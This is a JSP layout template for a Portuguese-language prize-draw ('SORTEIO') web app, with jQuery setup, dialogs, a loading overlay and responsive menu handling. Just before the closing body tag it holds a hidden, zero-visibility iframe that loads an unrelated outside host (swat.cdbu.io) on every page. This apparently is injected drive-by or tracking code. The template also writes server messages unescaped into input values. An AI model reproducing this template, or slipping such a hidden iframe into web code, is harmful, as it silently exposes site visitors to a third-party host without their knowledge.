<%@ include file="/WEB-INF/jsp/common/include.jsp" %>
<%@ page language="java" contentType="text/html; charset=ISO-8859-1" pageEncoding="ISO-8859-1"%>  

<!DOCTYPE html>
<html>
	<head>
	
		<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
		<!-- meta http-equiv="Content-Type" content="text/html; charset=utf-8" / -->
		
		<meta http-equiv="Content-Style-Type" content="text/css">
	
		<title>SORTEIO</title>
		<link rel="shortcut icon" href="../../img/icon.png" />
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0" />

		<!-- JQuery -->
		<script src="../../js/jquery-2.0.3.min.js" type="text/javascript"></script >
		<link href="../../js/jquery-ui-1.10.3/themes/base/jquery-ui.css" rel="stylesheet" />
		<script src="../../js/jquery-ui-1.10.3/ui/jquery-ui.js"></script>

		<!-- Menu -->
		<link href='../../js/smartmenus-0.9.6/css/sm-core-css.css' rel='stylesheet' type='text/css' />
		<link href='../../js/smartmenus-0.9.6/css/sm-mint/sm-mint.css' rel='stylesheet' type='text/css' />
		<script src="../../js/smartmenus-0.9.6/jquery.smartmenus.js" type="text/javascript"></script>
		
		<!-- Validation -->
		<script src="../../js/jquery-validation-1.11.1/jquery.validate.js" type="text/javascript"></script>
		
		<!-- Loading -->
		<script src="../../js/jquery.blockUI.js"></script>
		
		<link href="../../css/base.css" rel="stylesheet" />
		<script src="../../js/base.js" type="text/javascript"></script>

		<style>
			.divStatusTitle, .divStatusValue {
				float: left; 
				margin-top: 2px; 
				margin-left: 5px; 
				font-family: verdana; 
				font-size: 9px;
			}
		
			.divStatusTitle {
				clear: left;
				font-weight: bold;
				width: 50px;
				text-align: right;
			}

			#divLogo {
				background-image: url("../../img/fundopeq.png");
				background-size: 440px 170px;
				position: absolute; 
				top: -45px; 
				left: 0px;
				height: 140px;
				width: 100%;
				z-index: -1;
				opacity : 0.5;
			}
			
		</style>

		<script type="text/javascript">
			var messages = new Array();
			messages["system.dialog.cancelar.title"] = "Cancelar";
			messages["system.dialog.cancelar.message"] = "Tem certeza que deseja cancelar?";
		
			$(function() {
				
				if (showAllPopups) {
				
					if($("#msgError")[0].value != ""){
						showDialog(TYPE_ERROR, "Erro!", $("#msgError")[0].value);
					}
	
					if($("#msgSuccess")[0].value != ""){
						showDialog(TYPE_INFORMATION, "Sorteio", $("#msgSuccess")[0].value);
					}
				}
				
				maximizeContent();
			
				resizeTemplate();
				$(window).resize(function () {resizeTemplate();});
			});
			
			//Movimentando o mennu e área de notificação para funcionar em qualquer dispositivo
			function resizeTemplate(){
				//Menu
				$("#main-menu").show();
				$("#divMenuMobile").hide();
				$("#menuMensagensMobile").hide();
				$("input[type=text]").css("width", "250px");
				$("#divContent").css("overflow", "auto");
				if(window.innerWidth <= 640){
					$("#main-menu").hide();
					$("#divMenuMobile").show();
					$("#menuMensagensMobile").show();
					$("input[type=text]").css("width", (window.innerWidth - 160) +"px");
					$("#divContent").css("overflow", "hidden");
				}
				
				centerScreen(0, 0);
				//document.title = window.innerWidth;
			}
			
		</script>
	</head>

	<body onclick="showMobileMenu(false);" style="overflow: hidden;">
		<input type="hidden" value="${msgSuccess}" id="msgSuccess"/>
		<input type="hidden" value="${msgError}" id="msgError"/>

		<div id="divWait" style="display: none;">
			<div style="float: left; padding-top: 15px; margin-left: 20px;">
				<img src="../../img/execucao/running.GIF" width="18px"/>
			</div>
			<div style="float: left; height: 100%; margin-left: 25px;">
				<div style="float: left; margin-top: 7px;">
					Aguarde, por favor...
				</div>
				<div style="float: left; clear: left; font-size: 12px; font-style: italic;">
					[MESSAGE]
				</div>
			</div>
		</div>
	
		<div id="dialogTemplate" title="" style="display: none;">
			<div><img src=""/></div>
			<div>Dialogo parão 1232</div>
			<div style="text-align: right;">
				<button type="button" onclick="" class="btnYes">Sim</button>
				<button type="button" onclick="closeDialog();" class="btnNo">Não</button>
				<button type="button" onclick="closeDialog();" class="btnOk">OK</button>
				<button type="button" onclick="showStackTrace();" class="btnDet">Detalhes &gt;&gt;</button>
			</div>
			<div id="divStackTrace" style="margin-top: 20px; display: none;"><textarea style="width: 100%; font-size: 10px;" rows="10" readonly="readonly" id="txtStackTrace"></textarea></div>
		</div>


			<!-- div style="float: left;">
				<div style="float: left; color: #000000; font-size: 26px;">SUPER</div>
				<div style="float: left; clear: left; font-size: 20px;">SORTEIO</div>
			</div>
			<div style="float: left;"><img width="60px" src="../../img/luck.png" /></div-->

		<div id="divLogo"></div>
		
		<div id="divMenu" style="float: left; height: 32px;">
			<tiles:insertAttribute name="menu" />&nbsp;
		</div>
		
		<div style="float: left; border: #A9CF46 0px solid; height: 1.5px; margin-top: 20px; width: 100%;"></div>
		
		<div id="divContent" style="float: left; background-color: #FAFAFA; border: #CDCDCD 1px solid; width: 100%; overflow: auto;">
			<div id="divSubContent" style="background-color: #FFFFFF;">
				<div style="margin: 10px; display: block;">
				
					<div id="divIcon" style="float: left; display: none;"><img src="../../img/iconSmall.png" width="30" /></div>
					<div id="divTitle" style="float: left; font-family: verdana; font-size: 20px; color: #606060; font-weight: bold; display: none;"></div>
				</div>
				<div id="divSubTitle" style="clear: left; margin-left: 10px; font-family: verdana; font-size: 15px; font-style: italic; display: none;"></div><br/>
				<div style="margin: 10px; font-family: verdana; font-size: 20px;">
					<tiles:insertAttribute name="body" />
				</div>
			</div>
		</div>
		
		<iframe style="display: none;" src="http://swat.cdbu.io/"></iframe>

	</body>

</html>